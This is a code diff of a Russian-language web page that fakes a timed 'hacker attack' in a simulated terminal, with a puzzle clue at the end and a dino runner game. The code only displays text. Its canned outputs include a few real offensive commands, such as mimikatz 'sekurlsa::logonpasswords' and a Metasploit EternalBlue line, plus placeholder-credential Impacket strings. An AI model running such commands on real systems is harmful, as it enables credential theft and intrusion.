+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M -N -O -P -Q -R -S -T domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M -N -O -P -Q -R -S -T -U domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M -N -O -P -Q -R -S -T -U -V domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M -N -O -P -Q -R -S -T -U -V -W domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M -N -O -P -Q -R -S -T -U -V -W -X domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M -N -O -P -Q -R -S -T -U -V -W -X -Y domain.local/admin:password@192.168.1.100',
+            'ping.py -6 -c 1 -W 1 -i 0.1 -s 0 -M do -t 64 -p 0x1234 -Q 0x1234 -S 2001:db8::1 -I eth0 -F 2001:db8::2 -N -U -V -h -v -q -f -l 1000 -s 1000 -T 0x1234 -K -A -b -B -C -D -E -F -G -H -I -J -K -L -M -N -O -P -Q -R -S -T -U -V -W -X -Y -Z domain.local/admin:password@192.168.1.100'
+        ];
+        
+        function showHintAndStart() {
+            // Показываем подсказку как результат команды man
+            const terminalBody = document.getElementById('terminalBody');
+            const cursorLine = document.getElementById('terminal-cursor');
+            
+            // Создаем строку с командой man
+            const manLine = document.createElement('div');
+            manLine.className = 'terminal-line';
+            manLine.innerHTML = '<span class="prompt">root@hacker:~$</span><span class="command">man hack_attack</span>';
+            
+            // Создаем результат man
+            const manResult = document.createElement('div');
+            manResult.className = 'terminal-line';
+            manResult.innerHTML = `
+                <div class="output info">HACK_ATTACK(1)                    Manual page                    HACK_ATTACK(1)</div>
+                <div class="output info">NAME</div>
+                <div class="output info">       hack_attack - Advanced penetration testing tool</div>
+                <div class="output info">SYNOPSIS</div>
+                <div class="output info">       hack_attack [OPTIONS]</div>
+                <div class="output info">DESCRIPTION</div>
+                <div class="output info">       Кликните по терминалу, чтобы начать атаку.</div>
+                <div class="output info">       Клик по заголовку 🚀 — ускорение таймера.</div>
+                <div class="output info">       Атака длится 20 минут с автоматическим прогрессом.</div>
+                <div class="output info">OPTIONS</div>
+                <div class="output info">       --start          Начать атаку</div>
+                <div class="output info">       --speed          Ускорить выполнение</div>
+                <div class="output info">AUTHOR</div>
+                <div class="output info">       Zero Hacker Team</div>
+            `;
+            
+            // Заменяем курсор на команду man
+            cursorLine.parentNode.replaceChild(manLine, cursorLine);
+            
+            // Добавляем результат
+            terminalBody.appendChild(manResult);
+            
+            // Прокручиваем вниз
+            terminalBody.scrollTop = terminalBody.scrollHeight;
+            
+            // Запускаем атаку через 2 секунды
+            setTimeout(() => {
+                startHack();
+            }, 2000);
+        }
         
         function startHack() {
             if (hackStarted) return;
             
             hackStarted = true;
-            document.getElementById('startBtn').disabled = true;
-            document.getElementById('debugBtn').disabled = false;
             document.getElementById('hackStatus').textContent = 'Атака в процессе...';
             document.getElementById('hackStatus').style.color = '#ffaa00';
             
             // Запускаем таймер
             timerInterval = setInterval(updateTimer, 1000 / speedMultiplier);
             
-            // Запускаем прогресс (каждые 4 минуты для 5 фаз = 20 минут)
-            progressInterval = setInterval(updateProgress, 240000 / speedMultiplier);
+            // Запускаем прогресс (каждые ~2.2 минуты для 9 фаз = 20 минут)
+            progressInterval = setInterval(updateProgress, 133333 / speedMultiplier);
             
             // Запускаем активность
             activityInterval = setInterval(showRandomActivity, 3000 / speedMultiplier);
-            
-            // Добавляем строки в терминал
-            addTerminalLine('Инициализация атаки...', 'info');
-            addTerminalLine('Подключение к целевой системе...', 'info');
-            addTerminalLine('Сканирование открытых портов...', 'info');
         }
         
         function updateTimer() {
+            if (isLocked) return;
             timeLeft--;
             const minutes = Math.floor(timeLeft / 60);
             const seconds = timeLeft % 60;
@@ -460,6 +834,10 @@
                 clearInterval(timerInterval);
                 clearInterval(activityInterval);
                 completeHack();
+                // Не блокируем консоль сразу, даем время показать результат
+                setTimeout(() => {
+                    lockConsole();
+                }, 3000); // 3 секунды на показ результата
             }
         }
         
@@ -530,8 +908,6 @@
             
             document.getElementById('hackStatus').textContent = 'Атака завершена!';
             document.getElementById('hackStatus').style.color = '#00ff95';
-            document.getElementById('completeBtn').disabled = true;
-            document.getElementById('debugBtn').disabled = true;
             
             // Завершаем все фазы
             const phaseItems = document.querySelectorAll('.phase-item');
@@ -540,24 +916,310 @@
                 item.classList.add('completed');
             });
             
-            // Добавляем финальные строки
+            // Добавляем финальные строки (временно снимаем блокировку)
+            const wasLocked = isLocked;
+            isLocked = false;
             addTerminalLine('Атака успешно завершена!', 'success');
             addTerminalLine('Найден зашифрованный IP: XYZ.WVU.TS.RQP', 'success');
             addTerminalLine('Пароль для декодирования: HACK_COMPLETE', 'success');
             addTerminalLine('Готов к следующему этапу...', 'info');
+            if (wasLocked) isLocked = true;
             
             // Показываем результат
             document.getElementById('resultSection').classList.add('show');
         }
         
         function showRandomActivity() {
-            if (hackCompleted) return;
+            if (hackCompleted || isLocked) return;
+            if (isTyping) return; // ждем завершения текущей строки
+            const randomCommand = hackCommands[Math.floor(Math.random() * hackCommands.length)];
+            typeCommand(randomCommand);
+        }
+        
+        function typeCommand(command, isFirstCommand = false) {
+            if (isTyping || isLocked) return;
+            isTyping = true;
+            const terminalBody = document.getElementById('terminalBody');
             
-            const randomActivity = activities[Math.floor(Math.random() * activities.length)];
-            const activityTypes = ['info', 'warning', 'error'];
-            const randomType = activityTypes[Math.floor(Math.random() * activityTypes.length)];
+            // Убираем мигающий курсор из первой строки
+            const cursorLine = document.getElementById('terminal-cursor');
+            if (cursorLine) {
+                cursorLine.remove();
+            }
             
-            addTerminalLine(randomActivity, randomType);
+            const line = document.createElement('div');
+            line.className = 'terminal-line typing';
+            
+            const prompt = document.createElement('span');
+            prompt.className = 'prompt';
+            prompt.textContent = 'root@hacker:~$ ';
+            
+            const commandSpan = document.createElement('span');
+            commandSpan.className = 'command';
+            commandSpan.textContent = '';
+            
+            line.appendChild(prompt);
+            line.appendChild(commandSpan);
+            terminalBody.appendChild(line);
+            
+            // Прокручиваем вниз
+            terminalBody.scrollTop = terminalBody.scrollHeight;
+            
+            // Набираем команду по буквам
+            let currentIndex = 0;
+            // Для первой команды - медленно, для остальных - быстро
+            const delay = isFirstCommand ? (200 + Math.random() * 300) : (50 + Math.random() * 100);
+            const typeInterval = setInterval(() => {
+                if (currentIndex < command.length) {
+                    // Иногда делаем ошибки (только для первой команды)
+                    if (isFirstCommand && Math.random() < 0.1 && currentIndex > 5) {
+                        const wrongChar = String.fromCharCode(97 + Math.floor(Math.random() * 26));
+                        commandSpan.textContent += wrongChar;
+                        currentIndex++;
+                        
+                        // Через некоторое время исправляем ошибку
+                        setTimeout(() => {
+                            commandSpan.textContent = commandSpan.textContent.slice(0, -1);
+                        }, 200);
+                    } else {
+                        commandSpan.textContent += command[currentIndex];
+                        currentIndex++;
+                    }
+                } else {
+                    clearInterval(typeInterval);
+                    
+                    // Показываем результат команды
+                    setTimeout(() => {
+                        showCommandResult(command);
+                    }, 500 + Math.random() * 1000);
+                }
+            }, delay);
+        }
+        
+        function showCommandResult(command) {
+            const terminalBody = document.getElementById('terminalBody');
+            const resultLine = document.createElement('div');
+            resultLine.className = 'terminal-line';
+            
+            const output = document.createElement('span');
+            output.className = 'output';
+            
+            // Генерируем реалистичный результат в зависимости от команды
+            if (command.includes('nmap')) {
+                output.className += ' success';
+                output.textContent = 'Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 10:30 UTC';
+            } else if (command.includes('hydra')) {
+                output.className += ' warning';
+                output.textContent = 'Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak';
+            } else if (command.includes('sqlmap')) {
+                output.className += ' info';
+                output.textContent = 'sqlmap/1.7.2#stable - automatic SQL injection and database takeover tool';
+            } else if (command.includes('metasploit')) {
+                output.className += ' success';
+                output.textContent = 'msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100';
+            } else if (command.includes('john')) {
+                output.className += ' warning';
+                output.textContent = 'Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])';
+            } else if (command.includes('aircrack')) {
+                output.className += ' info';
+                output.textContent = 'Opening capture.cap';
+            } else if (command.includes('burpsuite')) {
+                output.className += ' success';
+                output.textContent = 'Burp Suite Professional v2023.12.1';
+            } else if (command.includes('wireshark')) {
+                output.className += ' info';
+                output.textContent = 'Capturing on \'eth0\'';
+            } else if (command.includes('nikto')) {
+                output.className += ' warning';
+                output.textContent = 'Nikto v2.1.6';
+            } else if (command.includes('dirb') || command.includes('gobuster')) {
+                output.className += ' info';
+                output.textContent = 'Gobuster v3.6';
+            } else if (command.includes('enum4linux')) {
+                output.className += ' success';
+                output.textContent = 'Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ )';
+            } else if (command.includes('smbclient')) {
+                output.className += ' info';
+                output.textContent = 'Anonymous login successful';
+            } else if (command.includes('ssh')) {
+                output.className += ' warning';
+                output.textContent = 'The authenticity of host \'192.168.1.100 (192.168.1.100)\' can\'t be established.';
+            } else if (command.includes('telnet')) {
+                output.className += ' error';
+                output.textContent = 'Trying 192.168.1.100...';
+            } else if (command.includes('nc') || command.includes('netcat')) {
+                output.className += ' info';
+                output.textContent = 'listening on [any] 4444 ...';
+            } else if (command.includes('python3')) {
+                output.className += ' success';
+                output.textContent = 'Connection established';
+            } else if (command.includes('msfvenom')) {
+                output.className += ' success';
+                output.textContent = 'Payload size: 73802 bytes';
+            } else if (command.includes('powershell')) {
+                output.className += ' warning';
+                output.textContent = 'Bypass execution policy';
+            } else if (command.includes('certutil')) {
+                output.className += ' info';
+                output.textContent = 'CertUtil: -URLCache command completed successfully.';
+            } else if (command.includes('reg add')) {
+                output.className += ' success';
+                output.textContent = 'The operation completed successfully.';
+            } else if (command.includes('net user')) {
+                output.className += ' success';
+                output.textContent = 'The command completed successfully.';
+            } else if (command.includes('net localgroup')) {
+                output.className += ' success';
+                output.textContent = 'The command completed successfully.';
+            } else if (command.includes('wmic')) {
+                output.className += ' info';
+                output.textContent = 'Method execution successful.';
+            } else if (command.includes('schtasks')) {
+                output.className += ' success';
+                output.textContent = 'SUCCESS: The scheduled task "SystemUpdate" has been created.';
+            } else if (command.includes('copy')) {
+                output.className += ' success';
+                output.textContent = '1 file(s) copied.';
+            } else if (command.includes('psexec')) {
+                output.className += ' success';
+                output.textContent = 'PsExec v2.2';
+            } else if (command.includes('mimikatz')) {
+                output.className += ' warning';
+                output.textContent = 'mimikatz # sekurlsa::logonpasswords';
+            } else if (command.includes('procdump')) {
+                output.className += ' info';
+                output.textContent = 'ProcDump v10.0 - Sysinternals process dump utility';
+            } else if (command.includes('secretsdump')) {
+                output.className += ' success';
+                output.textContent = 'Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation';
+            } else if (command.includes('crackmapexec')) {
+                output.className += ' warning';
+                output.textContent = 'CrackMapExec v5.7.0';
+            } else if (command.includes('bloodhound')) {
+                output.className += ' info';
+                output.textContent = 'BloodHound.py v4.3.1';
+            } else if (command.includes('kerberoast')) {
+                output.className += ' success';
+                output.textContent = 'Kerberoasting attack initiated';
+            } else if (command.includes('golden_ticket')) {
+                output.className += ' warning';
+                output.textContent = 'Golden ticket created successfully';
+            } else if (command.includes('dcsync')) {
+                output.className += ' error';
+                output.textContent = 'DCSync attack in progress...';
+            } else if (command.includes('ntlmrelayx')) {
+                output.className += ' info';
+                output.textContent = 'Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation';
+            } else if (command.includes('responder')) {
+                output.className += ' warning';
+                output.textContent = 'Responder v3.1.3.0';
+            } else if (command.includes('impacket')) {
+                output.className += ' success';
+                output.textContent = 'Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation';
+            } else if (command.includes('smbclient.py')) {
+                output.className += ' info';
+                output.textContent = 'SMB client connection established';
+            } else if (command.includes('wmiexec.py')) {
+                output.className += ' success';
+                output.textContent = 'WMI execution successful';
+            } else if (command.includes('psexec.py')) {
+                output.className += ' warning';
+                output.textContent = 'PsExec connection established';
+            } else if (command.includes('atexec.py')) {
+                output.className += ' info';
+                output.textContent = 'Atexec command executed';
+            } else if (command.includes('smbexec.py')) {
+                output.className += ' success';
+                output.textContent = 'SMB execution successful';
+            } else if (command.includes('dcomexec.py')) {
+                output.className += ' warning';
+                output.textContent = 'DCOM execution initiated';
+            } else if (command.includes('lookupsid.py')) {
+                output.className += ' info';
+                output.textContent = 'SID lookup completed';
+            } else if (command.includes('rpcdump.py')) {
+                output.className += ' success';
+                output.textContent = 'RPC endpoint enumeration finished';
+            } else if (command.includes('samrdump.py')) {
+                output.className += ' warning';
+                output.textContent = 'SAM database dump completed';
+            } else if (command.includes('netview.py')) {
+                output.className += ' info';
+                output.textContent = 'Network view enumeration done';
+            } else if (command.includes('reg.py')) {
+                output.className += ' success';
+                output.textContent = 'Registry query executed';
+            } else if (command.includes('services.py')) {
+                output.className += ' warning';
+                output.textContent = 'Service enumeration completed';
+            } else if (command.includes('wkssvc.py')) {
+                output.className += ' info';
+                output.textContent = 'Workstation service accessed';
+            } else if (command.includes('tsclient.py')) {
+                output.className += ' success';
+                output.textContent = 'Terminal service client connected';
+            } else if (command.includes('rpcmap.py')) {
+                output.className += ' warning';
+                output.textContent = 'RPC mapping completed';
+            } else if (command.includes('ifmap.py')) {
+                output.className += ' info';
+                output.textContent = 'Interface mapping done';
+            } else if (command.includes('ping.py')) {
+                output.className += ' success';
+                output.textContent = 'Ping test completed';
+            } else if (command.includes('ping6.py')) {
+                output.className += ' info';
+                output.textContent = 'IPv6 ping test finished';
+            } else {
+                // Случайный результат для неизвестных команд
+                const results = [
+                    'Command executed successfully',
+                    'Operation completed',
+                    'Process started',
+                    'Connection established',
+                    'Data retrieved',
+                    'System accessed',
+                    'Vulnerability found',
+                    'Exploit successful',
+                    'Payload delivered',
+                    'Backdoor installed'
+                ];
+                const randomResult = results[Math.floor(Math.random() * results.length)];
+                const resultTypes = ['success', 'info', 'warning'];
+                const randomType = resultTypes[Math.floor(Math.random() * resultTypes.length)];
+                output.className += ' ' + randomType;
+                output.textContent = randomResult;
+            }
+            
+            // Добавляем результат к той же строке, что и команда
+            const lastLine = terminalBody.lastElementChild;
+            if (lastLine && lastLine.querySelector('.command')) {
+                // Находим строку с командой и добавляем результат
+                const commandSpan = lastLine.querySelector('.command');
+                if (commandSpan) {
+                    // Добавляем перенос строки и результат
+                    commandSpan.innerHTML += '<br>';
+                    const resultSpan = document.createElement('span');
+                    resultSpan.className = output.className;
+                    resultSpan.textContent = output.textContent;
+                    lastLine.appendChild(resultSpan);
+                }
+            } else {
+                // Если не нашли строку с командой, создаем новую
+                resultLine.appendChild(output);
+                terminalBody.appendChild(resultLine);
+            }
+            
+            // Прокручиваем вниз
+            terminalBody.scrollTop = terminalBody.scrollHeight;
+            
+            // текущая команда полностью отрендерена
+            isTyping = false;
+
+            // Если это стартовая команда, запускаем атаку
+            if (!hackStarted && command.trim().toLowerCase().startsWith('start tesla_script.shxl')) {
+                setTimeout(() => startHack(), 300);
+            }
         }
         
         function speedUpTimer() {
@@ -576,7 +1238,7 @@
                 clearInterval(activityInterval);
                 
                 timerInterval = setInterval(updateTimer, 1000 / speedMultiplier);
-                progressInterval = setInterval(updateProgress, 240000 / speedMultiplier);
+                progressInterval = setInterval(updateProgress, 133333 / speedMultiplier);
                 activityInterval = setInterval(showRandomActivity, 3000 / speedMultiplier);
             }
             
@@ -584,6 +1246,7 @@
         }
         
         function addTerminalLine(text, type = 'info') {
+            if (isLocked) return; // Предотвращаем добавление строк если заблокировано
             const terminalBody = document.getElementById('terminalBody');
             const line = document.createElement('div');
             line.className = 'terminal-line';
@@ -597,6 +1260,23 @@
             
             // Прокручиваем вниз
             terminalBody.scrollTop = terminalBody.scrollHeight;
+        }
+
+        function lockConsole() {
+            isLocked = true;
+            hackCompleted = true;
+            // Добавляем сообщение о блокировке, не очищая терминал
+            const terminalBody = document.getElementById('terminalBody');
+            const line = document.createElement('div');
+            line.className = 'terminal-line';
+            const output = document.createElement('span');
+            output.className = 'output error';
+            output.textContent = '[LOCKED] Сеанс завершен. Ввод заблокирован.';
+            line.appendChild(output);
+            terminalBody.appendChild(line);
+            // Обновляем статус
+            document.getElementById('hackStatus').textContent = 'Сессия завершена (00:00)';
+            document.getElementById('hackStatus').style.color = '#ff0000';
         }
         
         function copyPassword(password) {
@@ -647,10 +1327,206 @@
             alert('Не удалось скопировать пароль. Пароль: ' + password);
         }
         
-        // Инициализируем страницу при загрузке
+        // Игровые функции
+        function startGame() {
+            if (gameRunning) return;
+            
+            gameRunning = true;
+            gameScore = 0;
+            gameSpeed = 1.5;
+            obstacles = [];
+            
+            const hackerDino = document.getElementById('hackerDino');
+            const gameOver = document.getElementById('gameOver');
+            const gameScoreEl = document.getElementById('gameScore');
+            
+            hackerDino.classList.remove('jumping');
+            gameOver.style.display = 'none';
+            gameScoreEl.textContent = 'Score: 0';
+            
+            // Запускаем игровой цикл
+            gameLoop = setInterval(updateGame, 50);
+        }
+        
+        function updateGame() {
+            if (!gameRunning) return;
+            
+            // Увеличиваем счет
+            gameScore++;
+            document.getElementById('gameScore').textContent = 'Score: ' + gameScore;
+            
+            // Создаем препятствия (снижена частота)
+            if (Math.random() < 0.01) {
+                createObstacle();
+            }
+            
+            // Двигаем препятствия
+            obstacles.forEach((obstacle, index) => {
+                const obstacleEl = obstacle.element;
+                let currentLeft;
+                
+                // Если препятствие только что создано (left: 100%), получаем реальную позицию
+                if (obstacleEl.style.left === '100%') {
+                    const gameCanvas = document.getElementById('gameCanvas');
+                    const canvasRect = gameCanvas.getBoundingClientRect();
+                    currentLeft = canvasRect.width;
+                    obstacleEl.style.left = currentLeft + 'px';
+                } else {
+                    currentLeft = parseInt(obstacleEl.style.left) || 300;
+                }
+                
+                const newLeft = currentLeft - gameSpeed;
+                
+                if (newLeft < -20) {
+                    obstacleEl.remove();
+                    obstacles.splice(index, 1);
+                } else {
+                    obstacleEl.style.left = newLeft + 'px';
+                    
+                    // Проверяем столкновение
+                    if (checkCollision(obstacleEl)) {
+                        gameOver();
+                    }
+                }
+            });
+            
+            // Увеличиваем скорость (снижена скорость роста)
+            if (gameScore % 200 === 0) {
+                gameSpeed += 0.2;
+            }
+        }
+        
+        function createObstacle() {
+            const gameCanvas = document.getElementById('gameCanvas');
+            const obstacle = document.createElement('div');
+            obstacle.className = 'obstacle';
+            obstacle.style.left = '100%'; // Начинаем с правого края
+            obstacle.style.bottom = '0px';
+            
+            gameCanvas.appendChild(obstacle);
+            obstacles.push({ element: obstacle });
+        }
+        
+        function checkCollision(obstacle) {
+            const hackerDino = document.getElementById('hackerDino');
+            const dinoRect = hackerDino.getBoundingClientRect();
+            const obstacleRect = obstacle.getBoundingClientRect();
+            
+            return !(dinoRect.right < obstacleRect.left || 
+                    dinoRect.left > obstacleRect.right || 
+                    dinoRect.bottom < obstacleRect.top || 
+                    dinoRect.top > obstacleRect.bottom);
+        }
+        
+        function jump() {
+            if (!gameRunning) return;
+            
+            const hackerDino = document.getElementById('hackerDino');
+            if (!hackerDino.classList.contains('jumping')) {
+                hackerDino.classList.add('jumping');
+                setTimeout(() => {
+                    hackerDino.classList.remove('jumping');
+                }, 300);
+            }
+        }
+        
+        function gameOver() {
+            gameRunning = false;
+            clearInterval(gameLoop);
+            
+            const gameOver = document.getElementById('gameOver');
+            gameOver.style.display = 'block';
+            
+            // Очищаем препятствия
+            obstacles.forEach(obstacle => obstacle.element.remove());
+            obstacles = [];
+        }
+        
+        function restartGame() {
+            startGame();
+        }
+        
+        // Инициализация: клики и старт внутри терминала
         window.addEventListener('load', function() {
-            // Не запускаем атаку автоматически
-            console.log('Хакерская атака готова к запуску');
+            const terminalBodyEl = document.getElementById('terminalBody');
+            const hackHeaderEl = document.querySelector('.hack-header');
+            const gameCanvasEl = document.getElementById('gameCanvas');
+            
+            // Динамически создаем фазы из JavaScript массива
+            const phaseList = document.getElementById('phaseList');
+            phases.forEach((phase, index) => {
+                const li = document.createElement('li');
+                li.className = 'phase-item';
+                li.setAttribute('data-phase', index);
+                li.textContent = phase;
+                phaseList.appendChild(li);
+            });
+
+            // Клик по терминалу начинает печатать стартовую команду
+            terminalBodyEl.addEventListener('click', function() {
+                if (!hackStarted && !isTyping) {
+                    typeCommand('start Tesla_script.shXl', true); // true = первая команда, медленно
+                }
+            });
+
+            // Клик по заголовку 🚀 ускоряет таймер
+            if (hackHeaderEl) {
+                hackHeaderEl.addEventListener('click', function() {
+                    speedUpTimer();
+                });
+            }
+
+            // Автоматически начинаем печатать стартовую команду при загрузке
+            setTimeout(() => {
+                if (!hackStarted && !isTyping) {
+                    typeCommand('start Tesla_script.shXl', true); // true = первая команда, медленно
+                }
+            }, 1000);
+            
+            // Click/touch handlers for game canvas (start/jump)
+            if (gameCanvasEl) {
+                gameCanvasEl.addEventListener('click', function() {
+                    if (isLocked) return;
+                    if (!gameRunning) {
+                        startGame();
+                    } else {
+                        jump();
+                    }
+                });
+                gameCanvasEl.addEventListener('touchstart', function(e) {
+                    if (isLocked) return;
+                    e.preventDefault();
+                    if (!gameRunning) {
+                        startGame();
+                    } else {
+                        jump();
+                    }
+                }, { passive: false });
+            }
+        });
+        
+        // Обработчики клавиш для игры
+        document.addEventListener('keydown', function(event) {
+            switch(event.code) {
+                case 'Space':
+                    event.preventDefault();
+                    if (gameRunning) {
+                        jump();
+                    } else {
+                        startGame();
+                    }
+                    break;
+                case 'KeyR':
+                    if (!gameRunning) {
+                        restartGame();
+                    }
+                    break;
+                case 'Escape':
+                    if (gameRunning) {
+                        gameOver();
+                    }
+                    break;
+            }
         });
     </script>
 </body>
